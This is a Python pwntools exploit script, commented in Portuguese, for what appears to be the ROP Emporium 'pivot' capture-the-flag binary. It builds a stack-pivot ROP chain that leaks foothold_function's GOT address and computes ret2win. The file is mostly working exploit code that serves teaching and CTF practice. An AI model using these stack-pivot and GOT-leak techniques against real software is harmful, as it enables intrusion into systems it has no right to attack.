#!/usr/bin/env python2
# -*- coding: utf-8 -*-

### IMPORTS ###
from pwn import *

### PREPARATION ###
elf = elf.binary = ELF('pivot')
p = process(elf.path)


### INITIAL EXPLAINED ###
'''
Não temos espaço o suficiente para escrever na stack, por isso precisamos fazer um pivoting para outro lugar da stack
Pelo o que eu estava vendo no GHIDRA, o binário aloca 2 regiões
1º Muito grande, porém não é acessada
2º Apenas de 64 bytes, sendo que usamos 40 para o padding
Me parece que a 1º é uma aloção na memória HEAP, não tenho certeza, mas o que importa é que ela está lá e podemos usá-la

Então o que devemos fazer é: com os 15 bytes sobrando que temos na área que conseguimos redirecionar o nosso RSP para a outra região
Para que a função ret2win() possa fazer a sua função corretamente
Porém surge outro problema, essa função não é referenciada em nenhum lugar do binário, ela está sendo usada apenas na libc disponibilizada pelo desafio

Outros problemas vão surgir e irei comentar sobre eles, juntamente com a resolução dos mesmos
Mas a ideia desse texto principal é te dar uma ideia do que estamos lidando

Então, vou comentar sobre os endereços
Precisamos do offset da função foothold e da ret2win, ambas encontradas com objdump como alvo a libc, segue o exemplo:
objdunp -D -M intel libpivot.so | egrep "foothold_function|ret2win"
Resultado:
000000000000096a <foothold_function>:
0000000000000a81 <ret2win>:
Eliminei os zeros para deixar o código mais clean, e essa remoção dos zeros não afetará em nada porque zeros a esquerdas não contam

Depois de pegar os offsets precisamos pegar a PLT e a GOT da foothold para pegarmos o endereço .got.plt da foothold, ou seja, pegar o enderçeo efetivo dela
*Se você não sabe sobre as seções PLT e GOT sugiro o estudo, pois a explicação delas iria ficar muito longa, se preferir me chame no discord que te passo um breve artigo escrito por mim*
Precisamos usar a foothold_function pelo menos uma vez para calcular o endereço da .got.plt da função, por conta do Lazy Binding

Eu mostrei duas formas de pegar o endereço da PLT e da GOT, a primeira forma é com o pwntools e a segunda é manualmente usando respectivamente o objdump(p/ pegar o da PLT) e o readelf(p/ pegar o da GOT)
PLT: objdump -D -M intel pivot | grep foothold
GOT: readelf pivot -a -t x | grep foothold

Quase me esqueci, os offsets vão servir para calcularmos a distância da função foothold para a ret2win
'''

### ADDRESS ###
ret2win_offset = 0xa81
foothold_offset = 0x96a

foothold_function_plt = elf.plt.foothold_function
foothold_function_got = elf.got.foothold_function
#foothold_function_plt = 0x400720
#foothold_function_got = 0x601040

### EXPLAINED GADGETS ###
'''
Não irei explicar o papel de cada gadgets pois vou comentar isso quando estiver montando o exploit
O único gadget que pode ser estranho é o xchg, ele basicamente troca os valores dos operando
Exemplo: 
RAX = 0xff
RBX = 0xa10

xchg rax, rbx

Resultado:
RAX = 0xa10
RBX = 0xff

Encontrei os gadgets usando o ROPgadget:
ROPgadget --binary pivot --ropchain --only "mov|pop|call|xchg|add|ret"
'''

### GADGETS ###
pop_rax = 0x4009bb
pop_rbp = 0x4007c8
xchg_rax_rsp = 0x4009bd
mov_rax_value_of_rax = 0x4009c0
add_rax_rbp = 0x4009c4
call_rax = 0x4006b0

### EXPLOIT ###
'''
Lembra do uso dos offsets? Eu comentei lá em cima que iriamos usar para calcular a distância entre eles
O que acontece é o seguinte:
Vamos vazar o endereço da foothold, com esse endereço em mãos precisamos saber com quantos bytes chegamos na ret2win
Sabendo disso é simples:
ret2win_offset - foothold_offset = endereço X
O endereço X somado com a foothold nos dá o endereço da ret2win (por isso o gadget add_rax_rbp)

O que estamos fazendo na pivot_addr é simplesmente pegando o endereço da região da memória em que temos bytes sobrando para a ret2win() fazer seu trabalho
Preciso formatar para pegar apenas o endereço em tempo de execução pois por conta do ASLR esse endereço é randomizado a cada execução
*Se quiser pode rodar várias vezes o pivote para ver o endereço mudando a cada execução*
Depois converto para um inteiro de base 16 para que a função p64() possa codificar nosso endereço (a p64 exige que o argumento seja em inteiro)
'''

calc = ret2win_offset - foothold_offset
pivot_addr = int(p.recvuntil('f10').strip()[-14:], 16)

# aqui sobra apenas 15 bytes por conta do padding, porém é necessário para fazer o pivoting

xpl1 = b''
xpl1 += b'A' * 40
xpl1 += p64(pop_rax)				# vai armazenar em rax o endereço da região da memória que queremos
xpl1 += p64(pivot_addr)				# rax = pivot_addr
xpl1 += p64(xchg_rax_rsp)			# vai colocar o pivot_addr em RSP, ou seja, fizemos o pivoting, a mudança para a região que queriamos

# tudo que acontecer daqui para baixo terá que caber dentro da região atual, temos 64 bytes porque não fizemos o padding

xpl = p64(foothold_function_plt)	# passamos a foothold_function@plt para ser resolvida pela primeira vez, porque assim o binário resolverá o endereço dela na .got.plt
xpl += p64(pop_rax) 				# em rax irá ter o endereço efetivo da foothold_function
xpl += p64(foothold_function_got)	# rax = foothold_function_got
xpl += p64(mov_rax_value_of_rax) 	# move o valor de rax (que é o endereço efetivo) para rax realmente
xpl += p64(pop_rbp)					# vai pegar o calc(que é o deslocamento calculado)
xpl += p64(calc)					# rbp = calc
xpl += p64(add_rax_rbp)				# em rax temos o nosso endereço da foothold@GOT e em RBP temos o offset da foothold - ret2win, somando rax com o rbp teremos o endereço da ret2win
xpl += p64(call_rax)				# o endereço resolvido da função ret2win será passado para rax, tudo isso na instrução acima, depois irá dar um call da função entregando assim a nossa flag 

'''
Enviamos o xpl primeiro porque não fizemos o padding ou seja, nos sobra 64 bytes
Enviamos o xpl1 depois porque só precisamos fazer o pivoting e nele terá poucas instruções então podemos fazer o padding
'''

### EXECUTE ###
p.recvuntil('> ')					# recebe até o input
p.sendline(xpl)						# envia o xpl que irá preparar tudo, ou seja, que irá chamar a função ret2win
p.recvuntil('> ')					# recebe ate o outro input

p.sendline(xpl1)					# envia o exploit que fará o pivoting para a região de memória que queremos
p.interactive()						# modo interativo para não ter que ficar recebendo linhas

### SAVING ###
with open('payload', 'w') as file:
	file.write(xpl + xpl1)
